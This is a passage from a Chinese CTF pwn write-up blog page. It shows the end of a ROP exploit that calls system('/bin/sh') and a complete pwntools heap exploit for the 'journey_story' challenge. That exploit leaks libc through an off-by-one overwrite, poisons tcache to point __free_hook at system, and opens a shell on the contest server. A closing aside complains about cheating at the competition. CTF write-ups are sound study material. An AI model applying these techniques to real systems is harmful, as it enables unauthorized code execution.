+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">=</span> flat([<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">64</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>), pop_rdi_ret, binsh_addr, ret, system_addr])
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload2)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h4 id="journey_story">journey_story</h4>
+<p>off by one，libc2.31 的菜单题，赛时发现和 22 年广东省赛的题比较像，正好做过，翻了下本地 exp 拿来就打</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> sys <span style="color:#f92672">import</span> argv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./journey_story&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> proc
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(proc, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;101.200.61.16&#34;</span>, <span style="color:#ae81ff">20595</span>) <span style="color:#66d9ef">if</span> argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;r&#39;</span> <span style="color:#66d9ef">else</span> process(proc)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.31.so&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>G:
+</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>attach(io)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_entry</span>(size, content):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Choose an option: &#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(hex(size)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(content)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete_entry</span>(index):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Choose an option: &#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">update_entry</span>(index, content):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Choose an option: &#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(content)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">view_entries</span>():
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Choose an option: &#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>):
+</span></span><span style="display:flex;"><span>    add_entry(<span style="color:#ae81ff">0xb0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaaa&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>):
+</span></span><span style="display:flex;"><span>    delete_entry(i)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>):
+</span></span><span style="display:flex;"><span>    add_entry(<span style="color:#ae81ff">0x28</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaaa&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>update_entry(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x28</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc1</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>delete_entry(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>add_entry(<span style="color:#ae81ff">0x28</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;eeee&#34;</span>)
+</span></span><span style="display:flex;"><span>view_entries()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Story 2 (size 0x28): &#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1ecbe0</span>
+</span></span><span style="display:flex;"><span>free_hook <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;__free_hook&#39;</span>]
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;libc_base =&gt; </span><span style="color:#e6db74">{</span>hex(libc_base)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">free_hook =&gt; </span><span style="color:#e6db74">{</span>hex(free_hook)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">system_addr =&gt; </span><span style="color:#e6db74">{</span>hex(system_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">3</span>):
+</span></span><span style="display:flex;"><span>    add_entry(<span style="color:#ae81ff">0x28</span>, (chr(<span style="color:#ae81ff">65</span> <span style="color:#f92672">+</span> i) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>delete_entry(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>delete_entry(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>view_entries()
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Story 7 (size 0x28): &#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>update_entry(<span style="color:#ae81ff">7</span>, p64(free_hook) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>add_entry(<span style="color:#ae81ff">0x28</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;kkkk&#34;</span>)
+</span></span><span style="display:flex;"><span>add_entry(<span style="color:#ae81ff">0x28</span>, p64(system_addr))
+</span></span><span style="display:flex;"><span>add_entry(<span style="color:#ae81ff">0xb0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>add_entry(<span style="color:#ae81ff">0xb0</span>, <span style="color:#e6db74">&#34;test&#34;</span>)
+</span></span><span style="display:flex;"><span>delete_entry(<span style="color:#ae81ff">9</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="闲聊">闲聊</h2>
+<p>初赛题目不是很难，主要是想去河南逛一圈（</p>
+<p>比赛是好比赛，初心是好的，只是 py 有点严重，基本上全是代打。我真不信某个大学的三支队伍同分同排名全是自己打的，但是今年没有要求录屏，咸鱼 flag 卖烂了也是正常的吧（</p>
+<p>有点恶心哈</p>
+<p><img src="https://pic.imgdb.cn/item/67443f4588c538a9b5bba2c3.jpg" alt="py直接发exp啊哥"></p>
+<p>怪不得四点多群里开始禁言了，捂大家嘴是吧。</p>
+<p>闹麻了。</p>
+
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+            <div class="post-tags">
+              <a href="/tags/pwn/">
+                Pwn
+              </a>
+            </div>
+            
+          </div>
+        </div>
+        
+          <div class="row">
+            <div class="col-xs-12">
+              
+            </div>
+          </div>
+
+          
+
+<div class="related-content">
+  <h3>Related Posts</h3>
+  <ul>
+    
+    <li><a href="/posts/paper-notes-of-addresssanitizer-a-fast-address-sanity-checker/">论文笔记《AddressSanitizer: A Fast Address Sanity Checker》</a></li>
+    
+    <li><a href="/posts/t1dctf2024-writeup/">T1DCTF2024 WriteUp</a></li>
+    
+    <li><a href="/posts/t1d_foolctf-2024-writeups/">foolctf 2024 WriteUp 和一些关于 shellcode 的反思</a></li>
+    
+  </ul>
+</div>
+
+
+
+          
+          
+          <div style="height: 50px;"></div>
+          
+        
+
+        
+
+<link rel="shortcut icon" href="favicon.ico" />
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js"></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        renderMathInElement(document.body, {
+            delimiters: [
+                {left: "$$", right: "$$", display: true},
+                {left: "$", right: "$", display: false}
+            ]
+        });
+    });
+</script>
+
+
+
+
+<link rel="stylesheet"
+  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/x86asm.min.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script>
+document.addEventListener('DOMContentLoaded', (event) => {
+  document.querySelectorAll('pre code').forEach((el) => {
+    hljs.highlightElement(el);
+  });
+});
+</script>
+
+
+
+
+      </div>
+    </div>
+  </article>
+
+  
+
+<script>
+  
+  
+    
+    
+  
+</script>
+
+  
+
+</body>
+
+</html>
